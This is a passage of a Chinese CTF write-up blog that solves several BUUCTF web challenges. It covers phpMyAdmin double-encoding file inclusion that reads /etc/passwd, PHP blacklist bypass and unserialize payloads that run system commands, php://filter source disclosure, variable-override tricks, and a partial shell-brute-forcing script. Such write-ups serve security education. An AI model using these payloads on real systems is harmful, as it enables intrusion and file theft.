class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

如果$page在白名单中就会直接return true，但这里考虑到了可能带参数的情况，所以有了下面的判断

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">    <span class="variable">$page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos ( <span class="built_in">string</span> $haystack , <span class="built_in">string</span> $needle [, <span class="built_in">int</span> $offset = <span class="number">0</span> [, <span class="built_in">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">查找<span class="built_in">string</span>在一个tring中首次出现的位置。基于字符数执行一个多字节安全的strpos()操作。第一个字符的位置是<span class="number">0</span>，第二个字符的位置是<span class="number">1</span>，以此类推。</span><br><span class="line"></span><br><span class="line">$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中就直接<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码</span><br><span class="line">        $_page = urldecode($page)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        )<span class="comment">;</span></span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span><span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

所以传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件
例如传入`?target=db_datadict.php%253f`
由于服务器会自动解码一次，所以在checkPageValidity()中，page的值一开始会是`db_datadict.php%3f`，又一次url解码后变成了`db_datadict.php?`，这次便符合了`?`前内容在白名单的要求，函数返回true 但在index.php中‘_REQUEST[‘target’]仍然是db_datadict.php%3f，而且会被include，通过目录穿越，就可造成任意文件包含。

本题的问题在于urldecode($page)方法，存在二次编码绕过

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">%<span class="number">25</span>的url编码为%</span><br><span class="line">%<span class="number">3</span>f的url编码为?</span><br><span class="line">%<span class="number">253</span>f--&gt;?</span><br><span class="line"></span><br><span class="line">payLoad：</span><br><span class="line">这里target参数只要不是黑名单中php文件就可以</span><br><span class="line"><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_datadict.php%<span class="number">253</span>f..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br><span class="line">flag应该位于系统的根目录，是这个</span><br><span class="line"><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_datadict.php%<span class="number">253</span>f..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure>

## [网鼎杯 2020 朱雀组]phpweb

![image-20220510144522083](./buu/image-20220510144522083.png)

接收到func和p，执行PHP内的date函数和格式化的Y-m-d h:i:s a，然后输出结果。既然这样，猜想一下在PHP内，执行$func="date"，肯定是没有问题的，但是如果提交的不是date，而是system，或exec呢？不妨用php内的md5函数测试一下，123经过md5加密后的值为202cb962ac59075b964b07152d234b70，如果成功执行回显在网页上，猜测就正确

![image-20220510144600721](./buu/image-20220510144600721.png)

system等被拦截了

这里可以利用file_get_contents获取index.php的源码

![image-20220510144728289](./buu/image-20220510144728289.png)

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);<span class="comment">//调调用传递函数，并返回函数运行的结果（本例中即为执行$func($p)）</span></span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;<span class="comment">//非空</span></span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);<span class="comment">//转小写</span></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;<span class="comment">//判断是否存在黑名单</span></span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);<span class="comment">//如果不存在则调用gettime，把funchep传入</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);<span class="comment">//报错</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

方法一:

php内的" \ "转义字符在做代码执行的时候，会识别特殊字符串，绕过黑名单

payload：?func=\system&p=find / -name flag*

payload：?func=\system&p=cat /tmp/flagoefiu4r93

![image-20220510145853724](./buu/image-20220510145853724.png)

方法二：

反序列化得flag手段

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="comment">//定义p和func</span></span><br><span class="line">       <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//对象被创建时自动调用</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">               <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

提交的func为unserialize，p为序列化后的字符串，然后反序列化test类

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p=<span class="string">&quot;find / -name flag*&quot;</span>;  <span class="comment">//$a-&gt;p=&quot;cat /tmp/flagoefiu4r93&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload:</span><br><span class="line">/index.php?func=unserialize&amp;p=O%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Test&quot;</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A<span class="string">&quot;p&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A<span class="string">&quot;find+%2F+-name+flag%2A&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;func&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A<span class="string">&quot;system&quot;</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">    </span><br><span class="line">/index.php?func=unserialize&amp;p=O%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Test&quot;</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A<span class="string">&quot;p&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A<span class="string">&quot;cat+%2Ftmp%2Fflagoefiu4r93&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;func&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A<span class="string">&quot;system&quot;</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>



## [BSidesCF 2020]Had a bad day

![image-20220510153108930](./buu/image-20220510153108930.png)

可能存在SQL注入或者文件包含，在我尝试读取index.php源码的时候出现了报错信息:`php://filter:/convert.base64-encode/resource=index.php`

![image-20220510153355995](./buu/image-20220510153355995.png)

是文件包含，但是有`index.php`却读取错误，报错显示**无法打开流：操作失败**在后面测试的时候，发现除掉后缀即可读取到源码,解码后：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回<span class="literal">false</span>.</span><br></pre></td></tr></table></figure>

传入的`category`需要有`woofers`,`meowers`,`index`才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php
 尝试直接读取`/index.php?category=woofers/../flag`

显示：![image-20220510152524515](./buu/image-20220510152524515.png)

出现了别的内容，包含成功了`flag.php`，但是这里也说了flag需要读取

如何去获取flag.php的内容呢?这里使用的知识点是php://filter伪协议套协议

`/index.php?category=php://filter/convert.base64-encode/index/resource=flag`

套一个字符`index`符合条件并且传入flag，读取flag.php

## [BJDCTF2020]Mark loves cat

进去就先扫一下dirsearch

git泄露，再用githack下载下来，有flag.php和index.php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;   <span class="comment">//如果传入＄x=flag&amp;＄y=flag 则$flag=$flag就可以输出结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">//不能同时 flag的值等于某个键名，那个键名又是flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125; <span class="comment">//不存在键名为flag的GET与POST，输出变量$yds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传入的POST的键名为flag，或GET的键名也为flag，值都为flag，则输出变量$is</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

index.php代码第9行和13行，根据$$和foreach可以判断可能存在变量覆盖漏洞，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。

解法一：exit($handsome);

函数判断到 `a=flag` 的时候， `$_GET['flag'] === $x && $x !== 'flag'` --> `a === a && a !== 'flag'` 这就进来了 `true && true` 就进来了， 然后 ``exit($handsome);`

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">($_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)</span></span>&#123; <span class="comment">//不能同时  flag的值等于某个键名，那个键名又是flag, 就是 flag=a &amp;&amp; a!=flag啊，这样就能进了  ?flag=(不是flag)&amp;(不是flag)=xxx</span></span><br></pre></td></tr></table></figure>

![image-20220510235544221](./buu/image-20220510235544221.png)

因为要 ``exit($handsome);`` 那么我们要做的就是 让` `$handsome = $flag ` get` 条件的处理如下

<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$</span>x = <span class="variable">$$</span>y;<span class="regexp">//</span> <span class="variable">$handsome</span> = flag的值  ---&gt;   <span class="variable">$handsome</span> = <span class="variable">$flag</span>  --&gt; <span class="variable">$x</span>=handsome &amp; <span class="variable">$y</span>=flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`$<span class="variable">$x</span> = $<span class="variable">$y</span>``而我们要的结果是``<span class="variable">$handsome</span> = <span class="variable">$flag</span>``那么特简单 让 ``<span class="variable">$x</span>=handsome 和 <span class="variable">$y</span>=flag``即可</span><br><span class="line"> payload1：`http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/CTF/</span>?handsome=flag&amp;flag=b&amp;b=flag`</span><br><span class="line"> payload2：`http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/CTF/</span>?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure>

解法二：exit($yds);

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入这个 <span class="keyword">exit</span>语句:GET,POST 都不设置flag就进去了</span><br><span class="line">/?yds=flag</span><br></pre></td></tr></table></figure>

解法三：exit($is);

`/?is=flag&flag=flag`

## [强网杯 2019]高明的黑客

1、我们先打开题目，提示可以下载源码：

![image-20220511225851348](./buu/image-20220511225851348.png)

下载源码，打开是几千个`php`文件，而且很乱，根本没法看，不过里面包含很多`shell`

![image-20220511225919731](./buu/image-20220511225919731.png)

不过很多`shell`都没用，所以我们猜测这几千个`php`文件中肯定含有可以使用的shell，我们只有写脚本去试了。

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy_pro/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span 